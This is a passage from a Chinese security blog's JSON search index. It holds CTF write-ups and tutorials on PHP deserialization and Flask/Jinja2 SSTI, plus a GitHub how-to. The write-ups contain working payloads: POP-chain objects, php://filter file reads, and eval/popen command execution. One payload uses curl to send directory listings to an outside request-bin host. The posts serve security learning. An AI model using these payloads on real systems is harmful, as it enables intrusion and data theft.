nion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125; 然后用户名为admin，密码为1登录即可","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"github使用","slug":"github使用","date":"2021-10-02T04:27:09.000Z","updated":"2022-03-28T08:21:51.633Z","comments":true,"path":"2021/10/02/github使用/","link":"","permalink":"https://ethe448.github.io/2021/10/02/github%E4%BD%BF%E7%94%A8/","excerpt":"​ 在学python的时候顺便学了些GitHub的使用，写个文档防止忘了","text":"​ 在学python的时候顺便学了些GitHub的使用，写个文档防止忘了 绑定用户 打开git-bash 填写用户名和密码 提示（配置的帐号名和邮箱一定要与GitHub相同，不然会提交失败） git config --global user.name &quot;@@@&quot; (GitHub相对应的帐号名称) git config --global user.email &quot;123@163.com&quot; （GitHbu相对应的邮箱帐号） 设置ssh key 生成ssh key 首先检查是否已生成密钥 cd ~/.ssh，ls如果有3个文件，则密钥已经生成，id_rsa.pub就是公钥 如果没有，输入: ssh-keygen -t rsa -C &quot;你的邮箱&quot; 复制ssh key 方法1: 输入 clip &lt; ~/.ssh/id_rsa.pub 会自动复制ssh key，可以直接粘贴 方法2:在c/Users/Administrator/.ssh/id_rsa)文件找到直接复制 连接github，打开GitHub 进入setting找到ssh key并新建 format,png.png) 然后测试连接是否成功 输入: ssh -T &#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d; 上传 上传的基本步骤就是这样了 先打开一个文件夹按着图片里的步骤来 先初始化再把想传的文件传上去 可以用git add .上传所有文件 注： 输入git add .后如果报错 warning: LF will be replaced by CRLF in gradlew. The file will have its original line endings in your working directory 则再输入git config --global core.autocrlf false后再重新输入git add .命令即可 git commit添加备注 克隆仓库 $ git clone 网址 [自定义目录名] 可以用https://或git://或ssh传输协议 查看连接的仓库地址 git remote -v 如果在另外的文件夹提交需重新进行一遍图中步骤 还要再push前输入 git pull --rebase origin main 该命令的意思是把远程库中的更新合并到（pull=fetch+merge）本地库中，–-rebase的作用是取消掉本地库中刚刚的commit，并把他们接到更新后的版本库之中。出现如下图执行pull执行成功后，可以成功执行git push origin main操作。 否则就会因为本地库与远程库不一致导致报错","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"反序列化","slug":"反序列化","date":"2021-06-29T16:19:02.000Z","updated":"2022-03-28T08:21:06.555Z","comments":true,"path":"2021/06/30/反序列化/","link":"","permalink":"https://ethe448.github.io/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数 serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法","text":"基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数 serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法 几个常见的魔术方法 __construct： 在创建对象时候初始化对象，一般用于对变量赋初值。 __destruct： 和构造函数相反，当对象所在函数调用完毕后执行。 __toString：当对象被当做一个字符串使用时调用。 __sleep:序列化对象之前就调用此方法(其返回需要一个数组) __wakeup:反序列化恢复对象之前调用该方法 __call:当调用对象中不存在的方法会自动调用该方法。 __get:在调用私有属性的时候会自动执行 __isset()在不可访问的属性上调用isset()或empty()触发 __invoke() 当尝试把对象当方法调用时调用。 __unset()在不可访问的属性上使用unset()时触发 格式 O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125; 类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125; 序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 private类型有隐藏的空格符 反序列化的常见起点 __wakeup 一定会调用 __destruct 一定会调用 __toString 当一个对象被反序列化后又被当做字符串使用 反序列化的常见中间跳板: __toString 当一个对象被当做字符串使用__get 读取不可访问或不存在属性时被调用__set 当给不可访问或不存在属性赋值时被调用__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func(); 反序列化的常见终点: __call 调用不可访问或不存在的方法时被调用call_user_func 一般php代码执行都会选择这里call_user_func_array 一般php代码执行都会选择这里 POP链简介借鉴的文章： php反序列化利用——POP链构造实例 - 简书 (jianshu.com) (1条消息) PHP反序列化—构造POP链_Lemon&#39;s blog-CSDN博客_php反序列化pop链 POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。 POP链利用技巧1、一些有用的POP链中出现的方法： - 命令执行：exec()、passthru()、popen()、system() - 文件操作：file_put_contents()、file_get_contents()、unlink() 2、反序列化中为了避免信息丢失，使用大写S支持字符串的编码。PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这 个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过，即： s:4:\"user\"; -> S:4:\"use\\72\"; 3、深浅copy：在 php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。 4、配合PHP伪协议实现文件包含、命令执行等漏洞。 wp先贴俩之前写的简单的 [ZJCTF 2019]NiZhuanSiWei 看见file_get_contents(),利用伪协议data://text/plain;base64绕过 再利用php://filter读取useless内的内容 解码后 可知flag在flag.php中 试图让file=flag.php 看到unserialize函数，利用php反序列化 构造payload ？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 查看源码找到flag [极客大挑战 2019]PHP页面中提示有备份文件，御剑扫一遍 找到存在www.zip 重点在class.php和index.php中 所以要传入一个select参数，利用反序列化让username=admin password=100 因为username和password两个为private类型 所以有隐藏的空格符 select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot; [MRCTF2020]Ezpop题目源码 class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125; &#125; class Show&#123; public $source; public $str; public function __construct($file&#x3D;&#39;index.php&#39;)&#123; $this-&gt;source &#x3D; $file; echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;&#x2F;gopher|http|file|ftp|https|dict|\\.\\.&#x2F;i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source &#x3D; &quot;index.php&quot;; &#125; &#125; &#125; class Test&#123; public $p; public function __construct()&#123; $this-&gt;p &#x3D; array(); &#125; public function __get($key)&#123; $function &#x3D; $this-&gt;p; return $function(); &#125; &#125; if(isset($_GET[&#39;pop&#39;]))&#123; @unserialize($_GET[&#39;pop&#39;]); &#125; else&#123; $a&#x3D;new Show; highlight_file(__FILE__); &#125; 题目里出现的魔术变量 __construct 当一个对象创建时被调用， __toString 当一个对象被当作一个字符串被调用。 __wakeup() 使用unserialize时触发 __get() 用于从不可访问的属性读取数据 #难以访问包括：（1）私有属性，（2）没有初始化的属性 __invoke() 当脚本尝试将对象调用为函数时触发 这里可以看出来首先要get进一个pop值，并进行反序列化，所以就会调用__wakeup()这个方法_ __wakeup()中里利用preg_match对传入的值进行过滤，但如果this-&gt;source是show类，就会调用__toString 这里会返回$this-&gt;str-&gt;source，但如果没有source这个属性，接下来就会调用__get()，然后会将对象调用为函数， 这里也就会触发__invoke()，进而调用append 在append的中存在include，所以可以利用文件包含漏洞读到flag payload （自己写一个还是有点困难 &lt;?php class Modifier &#123; protected $var &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#39;; &#125; class Show &#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source &#x3D; $file; &#125; &#125; class Test &#123; public $p; &#125; $a &#x3D; new Show(&#39;aaa&#39;); $a-&gt;str &#x3D; new Test(); $a-&gt;str-&gt;p &#x3D; new Modifier(); $b &#x3D; new Show($a); echo urlencode(serialize($b)); base64解码拿到flag CODE REVIEW 代码审计可以看出这里首先要先get进pleaseget=1然后post进pleasepost，md51，md52和obj四个值，而obj这里存在反序列化的漏洞 且当if($this-&gt;correct === $this-&gt;input)成立时就会打印出flag 这里同时要求传入的md51和md52的md5值相等，且自身不相等，由于md5不能处理数组，所以传入数组的返回值都为null 而因为$this-&gt;correct这里进行了编码，所以要使if语句成立在构造payload时可以采用引用赋值的方法 构造payload //uniqid() :函数基于以微秒计的当前时间，生成一个唯一的 ID。 //传值赋值：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。 //引用赋值：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。 所以最终payload为 get内容为：?pleaseget=1 post内容为：pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;} 拿到flag [网鼎杯 2020 青龙组]AreUSerialz源码 &lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op &#x3D; &quot;1&quot;; $filename &#x3D; &quot;&#x2F;tmp&#x2F;tmpfile&quot;; $content &#x3D; &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123; $res &#x3D; $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res &#x3D; file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res &#x3D; &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res &#x3D; file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;) $this-&gt;op &#x3D; &quot;1&quot;; $this-&gt;content &#x3D; &quot;&quot;; $this-&gt;process(); &#125; &#125; function is_valid($s) &#123; for($i &#x3D; 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125)) return false; return true; &#125; if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123; $str &#x3D; (string)$_GET[&#39;str&#39;]; if(is_valid($str)) &#123; $obj &#x3D; unserialize($str); &#125; &#125; 看到unserialize可以很容易想到反序列化，源码里还有file_get_contents，所以猜测这题是利用反序列化通过文件包含读取flag，利用php://filter来造成任意文件读取 在传入后还存在一个is__valid()函数的过滤，要求传入内容的ascii码在32到123之内 之后进行反序列化，由于要利用file_get_contents()读取flag，并将其打印出来，所以需要让op=2，执行read()中的内容 构造payload 这里因为protect进行反序列化时会出现特殊符号，导致无法通过is__valid函数的过滤，可以利用对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。 ?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; （刚开始给op赋了个字符型的“2”，找错找了半天。。。 拿到flag 接下来base64解码就可以拿到flag了 这周划水了（ 忙着学科目三了，周三考完试再补点（","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"ssti模板注入","slug":"ssti模板注入","date":"2021-06-25T04:19:20.000Z","updated":"2022-03-28T08:22:37.093Z","comments":true,"path":"2021/06/25/ssti模板注入/","link":"","permalink":"https://ethe448.github.io/2021/06/25/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。","text":"不会python看的我好懵，一些类、对象和魔术变量的部分都不是太懂。。。。 ssti概述贴个大佬的文章 浅析SSTI(python沙盒绕过)_白帽子技术/思路_i春秋社区-分享你的技术，为安全加点温度. (ichunqiu.com) CTF SSTI(服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com) [关于python魔术方法payload：““.class.mro2].subclasses()40.read() 的解释_xiao__1bai的博客-CSDN博客 模板注入总结_Herbert_555的博客-CSDN博客 SSTI(Server-Side Template Injection);即模板注入，与我们熟知的SQL注入、命令注入等原理大同小异。注入的原理可以这样描述：当用户的输入数据没有被合理的处理控制时，就有可能数据插入了程序段中变成了程序的一部分，从而改变了程序的执行逻辑；漏洞成因在于：render_template函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，{ { } }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{ { } }包裹的内容当做变量解析替换。比如{ {1+1} }会被解析成2。 flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数 __dict__ 保存类实例或对象实例的属性变量键值对字典 __class__ 返回类型所属的对象 __mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 __bases__ 返回该对象所继承的基类 &#x2F;&#x2F; __base__和__mro__都是用来寻找基类的 __subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表 __init__ 类的初始化方法 __globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 flask基本知识 flask采用装饰器来指定路由，默认的模板渲染引擎为Jinja2。其中模板的三种主要语法为 ：装载一个变量，渲染模板的时候，可以传入变量名和变量值模板会自动替换变量为传入的变量值 { % … % }:装载一个控制语句 :装载一个注释 流程： ​ 获取基本类 ​ 获取基本类的子类 ​ 找到重载过的__init__类 ​ 查看其引用__builtins__ ​ 调用其中可用的函数 获取基本类 ​ 利用__bases__或者是__mro__函数 &#39;&#39;.__class__.__mro__[2] &#123;&#125;.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] request.__class__.__mro__[8] &#x2F;&#x2F;针对jinjia2&#x2F;flask为[9]适用 //实话实说最后一个不是很懂 获取基类的子类 ​ 利用__subclasses__函数 object.__subclasses__() &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()&#125;&#125;&#x2F;&#x2F;这句可以查找所有的类 SSTI的主要目的就是从这么多子类中找出可以利用的类（一般是指读写文件的类）加以利用 我们可以利用的方法有&lt;type &#39;file&#39;&gt;等，（一般file在第40号） 找到重载过的__init__类 &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__ &lt;unbound method WarningMessage.__init__ &#123;().__class__.base__.__subclasses__().index(warnings.catch_warnings) 可以查看当前位置， 查看其引用__builtins__ &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;] 使用os模块执行命令来读取flag或者执行命令 &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) &#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125; 来、姿势 1、config &#123;&#123;config&#125;&#125;可以获取当前 &#123;&#123;config&#125;&#125;可以获取当前设置，如果题目类似app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;），那可以直接访问&#123;&#123;config['FLAG']&#125;&#125;或者&#123;&#123;config.FLAG&#125;&#125;得到flag 2、self &#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt; &#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config 3、&quot;&quot;、[]、()等数据结构 主要目的是配合__class__.__mro__[2]这样找到object类&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125; 4、url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等 如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。 例如： &#123;&#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125; &#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125;&#125; &#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;&#125; 常见的过滤绕过 (1)只过滤[] pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;/etc/passwd&#39;).read()若.也被过滤，使用原生JinJa2函数|attr()将request.__class__改成request|attr(&quot;__class__&quot;) (2)过滤_ 利用request.args属性&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__将其中的request.args改为request.values则利用post的方式进行传参 (3)关键字过滤 base64编码绕过__getattribute__使用实例访问属性时,调用该方法 例如被过滤掉__class__关键词&#123;&#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()&#125;&#125; 字符串拼接绕过&#123;&#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()&#125;&#125;&#123;&#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125;&#125; (4)过滤{ { 使用&#123;% if ... %&#125;1&#123;% endif %&#125;，例如 &#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.bin.buuoj.cn&#x2F;1inhq4f1 -d &#96;ls &#x2F; | grep flag&#96;;&#39;) %&#125;1&#123;% endif %&#125; 如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来 &#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;test&#39;).read()[0:1]&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125; (5)引号内十六进制绕过 &#123;&#123;&quot;&quot;.__class__&#125;&#125; &#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;]&#125;&#125; _&#96;是&#96;\\x5f&#96;，&#96;.&#96;是&#96;\\x2E (6)&quot; &#39; chr等被过滤，无法引入字符串 直接拼接键名 dict(buil&#x3D;aa,tins&#x3D;dd)|join() 利用string、pop、list、slice、first等过滤器从已有变量里面直接找 (app.__doc__|list()).pop(102)|string() 构造出%和c后，用格式化字符串代替chr &#123;%set udl&#x3D;dict(a&#x3D;pc,c&#x3D;c).values()|join %&#125; # uld&#x3D;%c &#123;%set i1&#x3D;dict(a&#x3D;i1,c&#x3D;udl%(99)).values()|join %&#125; (7)+等被过滤，无法拼接字符串 ~在jinja中可以拼接字符串 格式化字符串同上 例一：warnings.catch_warnings类 &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; PS：由于使用[‘globals’]会造成500的服务器错误信息，并且当我直接输入search=globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[‘glo’+&#39;bals’] 最后获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125; 例二： class’site._Printer’类 &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125; 获取flag &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125; 例三：popen &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; &#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;)&#125;&#125; wp搭了个靶场 level 1先找基本类 再获取基本类的子类 找到重载过的__init__类 &#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__&#125;&#125; 查看其引用__builtins__ 利用eval命令执行来读取flag &#123;&#123;&#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)&#125;&#125; level 2这个过滤了{ { ，所以要采用{ % % }的形式 { % % }内加控制语句 且这里展示数据要利用{ % print % } &#123;% print &#39;&#39;.__class__.__mro__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;) %&#125; 还有一种是利用控制语句 寻找符合条件的子类再利用WarningMessage的__bulitins__执行代码这个还不太懂先贴一下payload &#123;%for sub in &#39;&#39;.__class__.__base__.__subclasses__()%&#125;&#123;%if sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125;&#123;%print sub.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#39;)%&#125;&#123;%endif%&#125;&#123;%endfor%&#125; 补: &#123;%if sub.__name__&#x3D;&#x3D;&#39;catch_warnings&#39;%&#125; 要利用&lt;class ‘warnings.catch_warnings’&gt;来调用eval os等命令&lt;class ‘warnings.catch_warnings’&gt;一般位置为59，可以用它来调用file、os、eval、commands等 调用file &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() #把 read() 改为 write() 就是写文件 import os [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls &#x2F;&#39;).read() 调用eval [].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__imp&#39;+&#39;ort__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ls .&#x2F;&quot;).read()&#39;) 调用system方法。（不包含system，可以绕过过滤system的情况） [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[12].__dict__.values()[144](&#39;whoami&#39;) 利用commands进行命令执行 &#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;commands&#39;).getstatusoutput(&#39;ls&#39;)&#125;&#125; level 3在学了在学了（ [GYCTF2020]FlaskApp题目里有base64加密、解密和一个提示页面，试一下就可以知道解密框存在ssti注入，且当报错时会进入debug模式在这里可以看到一部分源码 试着访问app。py &#123;% for i in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 这里可以看到过滤了一些内容 再查找目录内内容 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;&#x2F;&#39;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; os.listdir() 方法用于返回指定的文件夹包含的文件或文件夹的名字的列表。 看见一个this_is_the_flag.txt 尝试去访问,得到flag &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;%if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125; &#123;&#123;c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;this_is_the_f&#39;+&#39;lag.txt&#39;,&#39;r&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 也可以利用切片的方式 &#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1],&#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"ssti注入","slug":"ssti注入","permalink":"https://ethe448.github.io/tags/ssti%E6%B3%A8%E5%85%A5/"}]},{"title":"buu刷题记录","slug":"buu刷题记录","date":"2021-06-16T20:26:18.000Z","updated":"2022-03-28T08:21:39.385Z","comments":true,"path":"2021/06/17/buu刷题记录/","link":"","permalink":"https://ethe448.github.io/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","excerpt":"记录一下自己buu的刷题进度，留下点wp方便以后看","text":"记录一下自己buu的刷题进度，留下点wp方便以后看 [HCTF 2018]WarmUp 进入后看到滑稽表情，查看源码看到有source.php 看到php代码 要求传入一个字符串类型的file，且需满足class emmm中的条件 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;]; 判断传入的参数是否为空，且是否为string类型 if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#39;t see it&quot;; return false; &#125; 判断传入的参数中是否有白名单内的内容 if (in_array($page, $whitelist)) &#123; return true; &#125; mb_substr()函数切割参数从0到第mb_strpos()函数返回的数值 $_page &#x3D; mb_substr( $page, 0, mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); 判断切割后的参数是否在白名单中 if (in_array($_page, $whitelist)) &#123; return true; &#125; 切割后的参数经过url解码后再进行一次过滤 $_page &#x3D; 